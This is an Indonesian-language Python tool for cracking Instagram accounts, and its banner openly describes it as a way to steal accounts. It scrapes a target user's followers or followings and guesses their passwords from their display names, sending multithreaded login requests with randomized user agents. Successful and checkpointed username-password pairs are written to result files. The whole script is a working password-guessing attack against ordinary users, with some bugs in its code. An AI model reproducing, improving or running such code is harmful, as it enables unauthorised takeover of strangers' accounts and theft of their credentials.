import os,random,re,requests,json,bs4,time,datetime,calendar
from rich import print as prints
from datetime import datetime
from rich.panel import Panel as Panel
from rich.tree import Tree
from rich.table import Table as lipat
from rich.console import Console as solsapatu
from rich.columns import Columns as coli , Columns
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn



day = datetime.now().strftime("%d-%b-%Y")
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

Cik=[]
Meledak=[]
success=[]
checkpoint=[]
session = requests.Session()
console = solsapatu()
proxxy=[]
xtr=[]
dump=[]
internal=[]
following=[]
method=[]
xxkontol=[]
ugen=[]
# ------ [ warna dasar ] ------ #
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
H = "\033[0;92m" # HIJAU
K = "\033[0;93m" #KUNING
M = '\x1b[1;91m' # MERAH
P = "\033[0m" # PUTIH

#------------------[ WARNA FOR RICH ]-------------------#
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

#------------------[ RANDOM COLOR RICH ]-------------------#
L1 = "[#875f5f]" # LIGHT
G1  = "[#ffd700]" # GOLD
M1  = "[#875fd7]" # MEDIUM GREEN
P1   = "[#FF00FF]" # PINK
W1  = "[#FFFFFF]" # WHITE
S1   = "[#87afff]" # SKY BLUE
O1   = "[#d78700]" # ORANGE3
O3   = "[#ff5fff]" # MEDIUM ORCH3

UA1 = "Mozilla/5.0 (Linux; Android 11; Infinix X657B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 Instagram 218.0.0.19.108 Android (30/11; 320dpi; 720x1432; INFINIX MOBILITY LIMITED/Infinix; Infinix X657B; Infinix-X657B; mt6761; in_ID; 345526700)"


for x in range(1000):
    rr = random.randint
    rc = random.choice
    uacrack1 = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX2101 Build/RKQ1.{str(rr(111111,211111))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,99))} Mobile Safari/537.36"
    uacrack2 = f"Mozilla/5.0 (Linux; Android 11; Infinix X6512 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5000,5500))}.{str(rr(75,99))} Mobile Safari/537.36"
    uacrack3 = f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; LG-H918 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.{str(rr(3200,3500))}.84 Mobile Safari/537.36"
    uacrack4 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(9,16))}_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1"
    uacrack5 = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    uacrack6 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; LEGEND MAX Build/RP1A.{str(rr(111111,210000))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3500,4000))}.{str(rr(75,150))} UCBrowser/{str(rr(10,20))}.4.0.{str(rr(1300,1500))} Mobile Safari/537.36"
    uacrack7 = f"Mozilla/5.0 (Linux; Android 12; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,99))}.0.{str(rr(4500,4900))}.{str(rr(75,99))} Mobile Safari/537.36"
    uanyancek= random.choice([uacrack1, uacrack2, uacrack3, uacrack4, uacrack5, uacrack6, uacrack7])
    ugen.append(uanyancek)


try:
    url_proxy = random.choice([
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
              "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
              "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
              "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
              "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/socks5.txt",
              "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
              "https://raw.githubusercontent.com/ObcbO/getproxy/master/socks5.txt",
              "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
              "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
              "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks5.txt",
              "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
              "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
              "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt"
              ])
except:pass
   
#------------------[ PROXIES ]-------------------#
try:
    url = requests.get(f"{url_proxy}").text
    for ciah in url.splitlines():proxxy.append(ciah)
except requests.exceptions.ConnectionError:
   os.system("clear")
   prints(Panel(f"{P2}Anda Tidak Terhubung Ke Internet, Silahkan Periksa Koneksi Internet Anda",width=80,padding=(0,2),style=f"bold green"));time.sleep(3);exit()

def clear():
    os.system('cls')

def logo():
    try:cek_data = requests.get("http://ip-api.com/json/").json
    except:cek_data = {'-'}
    try:Iplu = cek_data["query"]
    except:Iplu = {'-'}
    prints(Panel.fit(f"[bold white]Script ini dibuat untuk have fun + maling akun ig dilarang keras membagikan atau shre script ini",style="bold green"))
    Meledak.append(Panel(f"[bold white]Author : Meledak X Cik",style="bold green"))
    Meledak.append(Panel(f"[bold white]ip adres : {Iplu}",style="bold green"))
    console.print(Columns(Meledak))


def cek():
    try:
        nama = open('username/IG.txt','r').read()
        coki = open('cookie/IG.txt','r').read()
        xtr.append(nama)
        try:
            get = session.get('https:[//www.instagram.com/api/v1/user/web_profile_info/?username='+xtr[0],cookie={'cookie':coki},headers={'user-agent':UA1})
            ceka = get.json()['data']['user']
            namafull = ceka['full_name']
            pengikut = ceka['edge_followed_by']['count']
            mengikut = ceka['edge_follow']['count']
            menu(namafull,pengikut,mengikut)
        except (ValueError,KeyError):
            prints(Panel.fit(f"[bold white]Maaf akun tumbal anda terkena checkpoint / akun tidak ada",style="{M2}"));exit()
    except IOError:
        MenuLogin()
        

def MenuLogin():
    try:
        cookie = open('cookie/IG.txt','r').read()
    except FileNotFoundError:
        clear()
        logo()
        Meledak = f"[bold white]1\n2\n3"
        Meledak2 = f"[bold white]Login via username dan cookie\nLogin via username dan pw\nKeluar tools"
        Meledak3 = f"[bold white]ON\nON\nON"
        Cik = lipat()
        Cik.add_column(f"[bold white]NO",justify="center")
        Cik.add_column(f"[bold white]MENU",justify="center",width=52)
        Cik.add_column(f"[bold white]STATUS",justify="center")
        Cik.add_row(Meledak,Meledak2,Meledak3)
        console.print(Cik,justify="left",style=f"bold green")
        p = input('Pilih menu di atas : ')
        if p in ['1','01']:
            Logincoki()
        elif p in ['2','02']:
            namapw()
        elif p in ['3','03']:
            os.system('exit')
            prints(Panel.fit(f"[bold white]jika anda ingin hapus cookie maka ketik (y/t)",style="bold green"))
            keluar =  input(f'└──╭➣ masukan pilihan : ')
            if keluar in ["y"]:
                prints(Panel.fit(f"[bold white]anda sudah menghapus cookies ,Terima kasih sudah memakai script Meledak X cik",style="bold green"));time.sleep(2)
                exit()
                os.system('rm -f cookie/IG.txt')
            else:
                prints(Panel.fit(f"[bold white]anda sudah keluar dari script tanpa menghapus cookie ,Terima kasih sudah memakai script Meledak X cik",style="bold green"));time.sleep(2)
                exit()
        else:
            prints(Panel.fit(f"[bold white]pilihan anda tidak ada di menu",style="bold red"))
            exit()

def Logincoki():
    try:
        kuki=open('cookie/IG.txt','r').read()
    except FileNotFoundError:
        prints(Panel(f"{P2}Sebelum Login Pastikan Akun Tumbal Bersifat Publik Dan Tidak Private",width=80,padding=(0,4),style=f"bold green"))
        us=input(f'└──╭➣ {H}Masukan Username :{H} ')
        cok=input(f'{P}└──╭➣ {H}Masukan Cookie   :{H} ')
        kuki=open('cookie/IG.txt','w').write(cok)
        user=open('username/IG.txt','w').write(us)
        time.sleep(6)
        prints(Panel(f"{P2}Login Akun Tumbal Berhasil, tunggu sebentar",width=80,padding=(0,7),style=f"bold green"));cek()


def namapw():
    print('')
    idf = input(f"+_ masukan username : ")
    pas = input(f"+_ masukan password : ")
    time.sleep(1)
    p = session.get("https://www.instagram.com/accounts/login/")
    heade = {
        'Host': 'www.instagram.com',
        'X-IG-App-ID': '1217981644879628',
        'X-IG-WWW-Claim': '0',
        'sec-ch-ua-mobile': '?1',
        'X-Instagram-AJAX': 'e776ba0cb975',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'X-Requested-With': 'XMLHttpRequest',
        'X-ASBD-ID': '198387',
        'User-Agent': UA1,
        'X-CSRFToken': p.cookies['csrftoken'],
        'Origin': 'https://z-p42.www.instagram.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://z-p42.www.instagram.com/accounts/onetap/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
    }
    data = {
		"enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{random.randint(1000000000, 99999999999)}:{pas}",
		"username": idf,
	    "queryParams": "{}",
	    "optIntoOneTap": 'false',
	    "stopDeletionNonce": "",
	    "trustedDeviceRecords": "{}"
    }
    response = session.post("https://www.instagram.com/accounts/login/ajax",headers=heade,data=data).text
    if "userld" in response or "sessionid" in session.cookies.get_dict():
        koki = (";").join([ku+"="+asu for ku ,asu in session.cookies.get_dict().items()])
        Meledak = Tree(Panel.fit(f"[bold green]Nama instagram : {idf}"))
        Meledak.add(Panel.fit(f"[bold green]password instagram : {pas}"))
        Meledak.add(Panel.fit(f"[bold green]Cookies instagram : {koki}"))
        prints(Meledak)
        time.sleep(2)
        open('cookie/IG.txt','w').write(koki)
        open('username/IG.txt','w').write(idf)
        cek()
    elif "checkpoint_required" in response:
        koki = (";").join([ku+"="+asu for ku ,asu in response.cookies.get_dict().items()])
        Meledak = Tree(Panel.fit(f"[bold yellow]Nama instagram : {idf}"))
        Meledak.add(Panel.fit(f"[bold yellow]password instagram : {pas}"))
        Meledak.add(Panel.fit(f"[bold yellow]Cookies instagram : {koki}"))
        prints(Meledak)
        exit()
    else:
        prints(Panel.fit(f"[bold red]username dan password anda salah"))

def menu():
    clear()
    logo()
    Meledak = f"[bold white]1\n2\n3"
    Meledak2 = f"[bold white]crack via pengikut\ncrack via mengikuti\nKeluar tools"
    Meledak3 = f"[bold white]ON\nON\nON"
    Cik = lipat()
    Cik.add_column(f"[bold white]NO",justify="center")
    Cik.add_column(f"[bold white]MENU",justify="center",width=52)
    Cik.add_column(f"[bold white]STATUS",justify="center")
    Cik.add_row(Meledak,Meledak2,Meledak3,style="bold green")
    console.print(Cik,justify="left",style=f"bold green")
    p = input('Pilih menu di atas : ')
    if p in ['1','01']:
        crackpengikut()
    elif p in ['2','02']:
        crackmengikuti()
    elif p in ['3','03']:
        os.system('exit')
    else:
        prints(Panel.fit(f"[bold white]pilihan anda tidak ada di menu",style="bold red"))
        exit()
    


def crackpengikut():
    cookie = open('cookie/IG.txt','r').read()
    dump.append('pengikut')
    prints(Panel.fit(f"Pastikan Username Target Yang Di Pilih Bersifat Publik Dan Jangan Private",width=80,style=f"bold green"))
    m = input(f'└──╭➣ Username Target : ')
    print(f"└──╭➣ Wait Collect Username {m}")
    id = idAPI(cookie,m)
    info = infoAPI(cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
    passwordAPI(info)

def crackmengikuti():
	cookie = open('cookie/IG.txt','r').read()
	try:
		dump.append('mengikuti')
		prints(Panel(f"{P2}Pastikan Username Target Yang Di Pilih Bersifat Publik Dan Jangan Private",width=80,style=f"bold green"))
		m = input(f'└──╭➣ Username Target : ')
		print(f"└──╭➣ Wait Collect Username {m}")
		id= idAPI(cookie,m)
		info = ifoAPI(cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
		passwordAPI(info)
	except Exception as e:
		print(e)
		
def idAPI(cookie,id):
	try:
		m = session.get("https://z-p42.www.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":UA1,"x-ig-app-id":'936619743392459'})
		m_jason = m.json()["data"]["user"]
		idx = m_jason["id"]
	except requests.exceptions.ConnectionError:
		prints(Panel(f'[bold white]koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"bold red"));time.sleep(3);exit()
	except Exception as e:
			prints(Panel(f'[bold white]username yang anda masukan tidak di temukan atau akun private',width=80,padding=(0,7),style=f"bold red"));exit()
	return idx

def infoAPI(cookie,api,id):
	try:
		x = session.get(api%(id),cookies=cookie,headers={"user-agent":UA1})
		x_jason=json.loads(x.text)
		for i in x_jason['users']:
			username = i["username"]
			nama = i["full_name"]
			internal.append(f'{username}|{nama}')
			following.append(username)
		if 'pengikut' in dump:
			maxid=x_jason['next_max_id']
			for z in range (9999):
				x=session.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":UA1})
				x_jason=json.loads(x.text)
				try:
					for i in x_jason['users']:
						username = i["username"]
						nama = i["full_name"]
						internal.append(f'{username}|{nama}')
						following.append(username)
					try:
						maxid=x_jason['next_max_id']
					except:
						break
				except:
					if 'challenge' in x.text:
						break
					else:
						continue
		else:pass
	except requests.exceptions.ConnectionError:
		prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"bold red"));time.sleep(3);exit()
	except Exception as e:
		prints(Panel(f'{P2}username yang anda masukan tidak di temukan atau akun private',width=80,padding=(0,7),style=f"bold red"));exit()
	return internal


def ifoAPI(cookie,api,id):
	try:
		x = session.get(api%(id),cookies=cookie,headers={"user-agent":UA1})
		x_jason=json.loads(x.text)
		for i in x_jason['users']:
			username = i["username"]
			nama = i["full_name"]
			internal.append(f'{username}|{nama}')
			following.append(username)
		if 'mengikuti' in dump:
			maxid=x_jason['next_max_id']
			for z in range (9999):
				x=session.get('https://i.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":UA1})
				x_jason=json.loads(x.text)
				try:
					for i in x_jason['users']:
						username = i["username"]
						nama = i["full_name"]
						internal.append(f'{username}|{nama}')
						following.append(username)
					try:
						maxid=x_jason['next_max_id']
					except:
						break
				except:
					if 'challenge' in x.text:
						break
					else:
						continue
		else:pass
	except requests.exceptions.ConnectionError:
		prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"bold green"));time.sleep(3);exit()
	except Exception as e:
		prints(Panel(f'{P2}username yang anda masukan tidak di temukan atau akun private',width=80,padding=(0,7),style=f"bold green"));exit()
	return internal

def passwordAPI(xnx):
		prints(Panel(f"{P2}Total Username Terkumpul : [bold white]{len(internal)}",width=80,padding=(0,20),style=f"bold green"))
		prints(Panel.fit(f"[[bold green]01[bold white]] i api  v1 login ajax"))
		u = input(f'Pilih Metode: ')
		if u in ["1","01"]:
			method.append('satu')
		else:
			method.append('satu')
		jah1 = f"{H2}01\n02\n03\n04"
		jah2 = f"{P2}Nama, Nama123,Nama345\nNama, Nama123, Nama1234\n Nama, Nama123, Nama1234, Nama12345 , Nama123456\nNama, Nama123, Nama1234, Manual"
		jah3 = f"{H2}ON\nON\nON\nON"
		meledak = lipat()
		meledak.add_column(f"{P2}NO", style="bold green", justify='center')
		meledak.add_column(f"{P2}PILIHAN", style="bold green", justify='center',width=55)
		meledak.add_column(f"{P2}STATUS", style="bold green", justify='center')
		meledak.add_row(jah1,jah2, jah3)
		console().print(meledak, justify='center',style=f"bold green")
		c = input(f'└──╭➣ Pilih 1 Sampai 4 : ')
		if c=='1':
			generateAPI(xnx,c)
		elif c=='2':
			generateAPI(xnx,c)
		elif c=='3':
			generateAPI(xnx,c)
		elif c=='4':
			prints(Panel(f"{P2}Masukan Password Manual Minimal Password 6 Karakter Jangan Sampe Kurang\nContoh Password : sayang,sayang123,indonesia,rahasia,farz123",width=80,style=f"bold green"))
			zx = input(f'└──╭➣ Masukan Password : ')
			generateAPI(xnx,c,zx)
		else:
			passwordAPI(xnx)
def generateAPI(user,o,zx=''):
		global prog,des,loop
		loop+=len(internal)
		xxkontol.append(Panel(f"""{H2}Hasil OK DiSimpan Di{P2}: {P2}result/{day}.txt""",width=39,style=f"bold green"))
		xxkontol.append(Panel(f"""{K2}Hasil CP DiSimpan Di{P2}: {P2}result/{day}.txt""",width=39,style=f"bold green"))
		console.print(Columns(xxkontol))
		prints(Panel(f"{P2}Crack Di Mulai Tekan [bold green]'Ctrl+Z'{P2} Di Keyboard Anda Jika Ingin Berhenti\n\n        {P2}Hidupkan Mode Pesawat 5 Detik Jika Terdeteksi Spam IP",width=80,padding=(0,4),style=f"bold green"))
		anims = random.choice(["clock","smiley","monkey","moon","earth"])
		prog = Progress(SpinnerColumn(f'{anims}'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(internal))
		with prog:
			with ThreadPoolExecutor(max_workers=15) as shinkai:
				for i in user:
					try:
						username=i.split("|")[0]
						password=i.split("|")[1].lower()
						for w in password.split(" "):
							if len(w)<3:
								continue
							else:
								w=w.lower()
								if o=="1":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'321']
									else:
										sandi=[w,w+'123',w+'1234',w+'321']
								elif o=="2":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'12345',w+'12346']
									else:
										sandi=[w,w+'123',w+'1234',w+'12345',w+'12346',password.lower()]
								elif o=="3":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
									else:
										sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
								elif o=="4":
									if len(zx) > 3:
										sandi = zx.replace(" ", "").split(",")
							if 'satu' in method:
								shinkai.submit(crackAPI,username,sandi)
							else:
								shinkai.submit(crackAPI,username,sandi)
					except:pass
		prints(Panel(f" {P2}Crack [bold green]{len(internal)} {P2}Username Selesai Hasil OK : {H2}{len(success)}{P2} Hasil CP : {K2}{len(checkpoint)}{P2} ",width=80,padding=(0,8),style=f"bold green"));time.sleep(4);exit()

def crackAPI(user,pas):
	global loop,success,checkpoint
	ses=requests.Session()
	ua = random.choice(ugen) 
	prog.update(des,description=f"{H2}i v1 ajax{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
	prog.advance(des)
	try:
		for pw in pas:
			p = ses.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/')
			head = {
                    'Host': 'i.instagram.com',
                    'Content-Length': '1102',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
                    'cache-control'     : 'no-cache',
                    'X-IG-App-ID': '1217981644879628',
                    'X-Instagram-AJAX': '0539e7c8538b',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': '*/*',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-ASBD-ID': '198387',
                    'User-Agent': ua,
                    'X-CSRFToken': p.cookies['csrftoken'],
                    'Origin': 'https://www.instagram.com',
                    'viewport-width'    : '400', 
                    'Accept-Language': 'en-US,en;q=0.9'}
			data = {
				    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{random.randint(1000000000, 99999999999)}:{pw}",
				    "username": user,
				    "queryParams": "{}",
				    "optIntoOneTap": 'false',
				    "stopDeletionNonce": "",
				    "trustedDeviceRecords": "{}"}
			respon = session.post("https://i.instagram.com/api/v1/web/accounts/login/ajax/", headers = head, data = data, allow_redirects = False).text
			if 'userId' in respon or 'href="https://www.secure.instagram.com/accounts/onetap/"' in respon:
				cookie = ";".join([key+"="+value.replace('"','') for key, value in session.cookies.get_dict().items()])
				Meletup = Tree(Panel.fit("{H2}{user} {P2}| {H2}{pw}"))
				Meletup.add(Panel.fit(f"{cookie}",style="bold yellow"))
				prints(Meletup)
				open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|\n')
				success.append(user)
				break
			elif 'checkpoint_url' in respon:
				checkpoint+=1
				cookie = ";".join([key+"="+value.replace('"','') for key, value in respon.cookies.get_dict().items()])
				Meletup = Tree(Panel.fit("{K2}{user} {P2}| {K2}{pw}"))
				Meletup.add(Panel.fit(f"{cookie}",style="bold red"))
				prints(Meletup)
				open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}\n')
				checkpoint.append(user)
				break
			else:
				continue
		loop-=1
	except requests.ConnectionError:
		time.sleep(1)
		
def makedirectory():
	try:os.mkdir('data')
	except:pass
	try:os.system('result')
	except:pass
	cek()

if __name__ == '__main__':
	os.system("git pull")
	makedirectory()